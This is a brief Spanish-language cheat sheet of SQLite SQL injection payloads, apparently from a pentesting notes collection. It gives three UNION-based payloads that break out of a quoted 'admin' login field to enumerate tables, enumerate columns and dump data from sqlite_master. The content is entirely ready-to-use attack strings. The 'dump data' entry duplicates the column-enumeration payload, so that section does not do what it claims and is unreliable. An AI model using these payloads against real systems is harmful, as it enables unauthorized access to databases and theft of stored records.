# conditional-based

# Conditional Based

## SQLite

### Enumerar tablas

```
admin")) union select 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -
```

### Enumerar columnas

```
admin")) union select 1,group_concat(sql),3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -
```

### Dumpear datos

```
admin")) union select 1,group_concat(sql),3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -
```